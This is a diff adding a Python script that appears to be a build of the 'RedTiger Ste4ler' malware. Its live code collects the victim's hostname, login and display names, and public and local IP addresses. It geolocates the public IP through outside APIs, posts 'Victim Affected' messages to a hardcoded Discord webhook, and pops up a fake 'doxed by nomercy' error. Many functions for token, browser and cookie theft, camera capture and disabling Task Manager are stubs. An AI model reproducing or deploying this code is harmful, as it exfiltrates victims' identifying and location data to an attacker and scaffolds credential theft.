@@ -1,0 +1,142 @@
+import sys
+import os
+import socket
+import win32api
+import requests
+import time
+
+def B10ck_K3y(): pass
+def Unb10ck_K3y(): pass
+def B10ck_T45k_M4n4g3r(): pass
+def B10ck_M0u53(): pass
+def B10ck_W3b5it3(): pass
+def St4rtup(): pass
+def Sy5t3m_Inf0(): pass
+def Op3n_U53r_Pr0fi13_53tting5(): pass
+def Scr33n5h0t(): pass
+def C4m3r4_C4ptur3(): pass
+def Di5c0rd_T0k3n(): pass
+def Di5c0rd_inj3c710n(): pass
+def Br0w53r_5t341(): pass
+def R0b10x_C00ki3(): pass
+def F4k3_3rr0r(): pass
+def Sp4m_0p3n_Pr0gr4m(): pass
+def Sp4m_Cr34t_Fil3(): pass
+def Shutd0wn(): pass
+    
+def Clear():
+    try:
+        if sys.platform.startswith("win"):
+            os.system("cls")
+        elif sys.platform.startswith("linux"):
+            os.system("clear")
+    except:
+        pass
+
+w3bh00k_ur1 = "https://discord.com/api/webhooks/1317300661712584735/8dU2ry1D3dYEtisHwxSr18zF07OsT7PUgcsxOsg8LphlSZDIigN_RsunSwsn2lVWZBLA"
+website = "redtiger.shop"
+color_embed = 0xa80505
+username_embed = 'RedTiger Ste4ler'
+avatar_embed = 'https://cdn.discordapp.com/attachments/1268900329605300234/1276010081665683497/RedTiger-Logo.png?ex=66cf38be&is=66cde73e&hm=696c53b4791044ca0495d87f92e6d603e8383315d2ebdd385aaccfc6dbf6aa77&'
+footer_text = "RedTiger Ste4ler | https://github.com/loxyteck/RedTiger-Tools"
+footer_embed = {
+        "text": footer_text,
+        "icon_url": avatar_embed,
+        }
+                 
+
+try: hostname_pc = socket.gethostname()
+except: hostname_pc = "None"
+
+try: username_pc = os.getlogin()
+except: username_pc = "None"
+
+try: displayname_pc = win32api.GetUserNameEx(win32api.NameDisplay)
+except: displayname_pc = "None"
+
+try: ip_address_public = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
+except: ip_address_public = "None"
+
+try: ip_adress_local = socket.gethostbyname(socket.gethostname())
+except: ip_adress_local = "None"
+
+try:
+    response = requests.get(f"https://{website}/api/ip/ip={ip_address_public}")
+    api = response.json()
+
+    country = api.get('country', "None")
+    country_code = api.get('country_code', "None")
+    region = api.get('region', "None")
+    region_code = api.get('region_code', "None")
+    zip_postal = api.get('zip', "None")
+    city = api.get('city', "None")
+    latitude = api.get('latitude', "None")
+    longitude = api.get('longitude', "None")
+    timezone = api.get('timezone', "None")
+    isp = api.get('isp', "None")
+    org = api.get('org', "None")
+    as_number = api.get('as', "None")
+except:
+    response = requests.get(f"http://ip-api.com/json/{ip_address_public}")
+    api = response.json()
+
+    country = api.get('country', "None")
+    country_code = api.get('countryCode', "None")
+    region = api.get('regionName', "None")
+    region_code = api.get('region', "None")
+    zip_postal = api.get('zip', "None")
+    city = api.get('city', "None")
+    latitude = api.get('lat', "None")
+    longitude = api.get('lon', "None")
+    timezone = api.get('timezone', "None")
+    isp = api.get('isp', "None")
+    org = api.get('org', "None")
+    as_number = api.get('as', "None")
+def F4k3_3rr0r():
+    import tkinter as tk
+    from tkinter import messagebox
+    root = tk.Tk()
+    root.withdraw()
+    messagebox.showerror("dox", "doxed by nomercy")
+
+payload = {
+    'content': f'****╔═════════════════Victim Affected═════════════════╗****',
+    'username': username_embed,
+    'avatar_url': avatar_embed,
+}
+requests.post(w3bh00k_ur1, json=payload)
+try: B10ck_K3y()
+except: pass
+try: B10ck_T45k_M4n4g3r()
+except: pass
+try: B10ck_W3b5it3()
+except: pass
+try: St4rtup()
+except: pass
+try: Sy5t3m_Inf0()
+except: pass
+try: Di5c0rd_T0k3n()
+except: pass
+try: Di5c0rd_inj3c710n()
+except: pass
+try: Br0w53r_5t341()
+except: pass
+try: R0b10x_C00ki3()
+except: pass
+try: C4m3r4_C4ptur3()
+except: pass
+try: Op3n_U53r_Pr0fi13_53tting5()
+except: pass
+try: Scr33n5h0t()
+except: pass
+payload = {
+    'content': f'****╚══════════════════{ip_address_public}══════════════════╝****',
+    'username': username_embed,
+    'avatar_url': avatar_embed,
+}
+requests.post(w3bh00k_ur1, json=payload)
+
+try: F4k3_3rr0r()
+except: pass
+try: Shutd0wn()
+except: pass
